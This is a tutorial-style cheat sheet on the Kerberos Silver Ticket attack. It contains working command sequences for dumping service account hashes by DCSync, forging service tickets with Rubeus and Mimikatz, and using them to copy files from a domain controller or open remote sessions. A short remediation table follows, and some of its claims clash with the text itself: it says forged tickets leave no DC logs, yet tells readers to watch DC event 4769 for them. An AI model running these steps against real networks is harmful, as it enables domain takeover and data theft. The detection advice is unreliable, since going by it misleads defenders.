# Silver Ticket Attack

## What It Is

A Silver Ticket is a **forged Ticket Granting Service (TGS)** for a specific service. Unlike a Golden Ticket (which forges a TGT and can access anything), a Silver Ticket forges access to one service directly — without ever contacting a Domain Controller.

**Why this is stealthy:** The DC is never involved. No DC logs. The only logs are on the target service host itself. This makes Silver Tickets significantly harder to detect than Golden Tickets.

**Trade-off:** Scope is limited to one service on one host.

---

## How It Works

1. You obtain the NTLM hash of the account running a service (e.g., the machine account or a service account)
2. You forge a TGS claiming any identity you want (e.g., "Administrator") with any group memberships
3. That TGS is encrypted with the service account's key — the DC never sees it
4. The target service decrypts it, trusts the contents, and grants access

**The critical point:** Kerberos relies on encryption to trust ticket contents. If you have the encryption key (the service account hash), you can write whatever you want in the ticket.

---

## What You Need

| Requirement | How to Get It |
|---|---|
| Service account NTLM hash | `lsadump::dcsync /user:<serviceaccount>` — or from secretsdump output |
| Domain SID | `whoami /user` → remove the last `-XXX` segment. Also in DCSync output |
| Target server FQDN | Known from enumeration — `dc01.corp.local`, `fileserver.corp.local` |
| Service type | Depends what access you want — see table below |

**Common service types:**

| Service | Access granted |
|---|---|
| `cifs` | File shares (SMB) — `\\server\share` access |
| `http` | Web service on IIS |
| `ldap` | LDAP queries against the target |
| `mssql` | SQL Server access |
| `host` | Allows `PsExec`-style remote execution |
| `rpcss` | Remote procedure calls |
| `wsman` | WinRM / PowerShell remoting |

---

## Attack Steps

### Step 1 — Get the Service Account Hash

If targeting a machine account (most common):
```sh
# From Linux — DCSync for the machine account
secretsdump.py corp.local/Administrator@dc01.corp.local -just-dc-user "dc01$"

# From Windows — Mimikatz DCSync
lsadump::dcsync /user:dc01$
```

If targeting a named service account:
```sh
lsadump::dcsync /user:sqlservice
secretsdump.py corp.local/Administrator@dc01.corp.local -just-dc-user sqlservice
```

### Step 2 — Get the Domain SID

```sh
# From Windows
whoami /user
# Output: CORP\Administrator S-1-5-21-111-222-333-500
# Domain SID = S-1-5-21-111-222-333  (remove the last -500)
```

### Step 3 — Forge the Silver Ticket (Rubeus)

```sh
# CIFS access (file shares) on dc01
.\Rubeus.exe silver /rc4:<SERVICE-ACCOUNT-HASH> /domain:corp.local /sid:S-1-5-21-111-222-333 /target:dc01.corp.local /service:cifs /user:FakeAdmin /ptt

# HTTP access on webserver
.\Rubeus.exe silver /rc4:<HASH> /domain:corp.local /sid:<SID> /target:webserver.corp.local /service:http /user:Administrator /ptt

# WinRM access
.\Rubeus.exe silver /rc4:<HASH> /domain:corp.local /sid:<SID> /target:server.corp.local /service:wsman /user:Administrator /ptt
```

| Flag | Value | Notes |
|---|---|---|
| `/rc4:` | Service account NTLM hash | NOT krbtgt — the account running the service |
| `/domain:` | `corp.local` | Domain FQDN |
| `/sid:` | `S-1-5-21-...` | Domain SID — no trailing RID |
| `/target:` | `dc01.corp.local` | Full FQDN of the target server |
| `/service:` | `cifs`, `http`, `ldap`... | What access you are forging |
| `/user:` | Any name | The identity inside the ticket |
| `/ptt` | — | Inject directly into the current session |

### Step 3 (Alternative) — Forge with Mimikatz

```sh
# Mimikatz uses kerberos::golden for both Golden and Silver tickets
# The /service: and /target: flags make it a Silver Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111-222-333 /target:dc01.corp.local /service:cifs /rc4:<SERVICE-ACCOUNT-HASH> /ptt
```

### Step 4 — Verify the Ticket

```sh
# Rubeus
.\Rubeus.exe klist

# Windows built-in
klist
```

### Step 5 — Use the Access

```sh
# File share access (cifs ticket)
dir \\dc01.corp.local\C$
copy \\dc01.corp.local\C$\sensitive.txt .

# WinRM access (wsman ticket)
Enter-PSSession -ComputerName dc01.corp.local

# LDAP access — run BloodHound or LDAP queries
```

---

## Silver vs Golden Ticket

| | Silver Ticket | Golden Ticket |
|---|---|---|
| **Forges** | TGS (service ticket) | TGT (master ticket) |
| **Hash needed** | Service account / machine account | krbtgt |
| **DC contact** | None — completely offline | None — completely offline |
| **Scope** | One service on one host | Any service, any host |
| **Stealth** | Very high — no DC logs | High — but PAC validation can catch it |

---

## Remediation

| Control | What it does |
|---|---|
| **Enable PAC validation** | Forces services to validate PAC with DC — catches forged tickets. Enable via `KrbtgtFullPacSignature` registry key. |
| **Rotate service account passwords regularly** | Invalidates any forged Silver Tickets using old hashes. |
| **gMSA (Group Managed Service Accounts)** | AD manages the password automatically and never exposes it — cannot be extracted for Silver Ticket attacks. |
| **Audit DCSync rights** | Restrict who can perform replication operations. |
| **Monitor event ID 4769** | Unusual service tickets (e.g., cifs to a DC from a non-admin host) are a signal. Silver Tickets will not generate 4768 (no TGT request), so absence of 4768 before 4769 is suspicious. |
| **Protected Users security group** | Forces Kerberos-only auth — Silver Tickets using RC4 will not work against accounts in this group. |
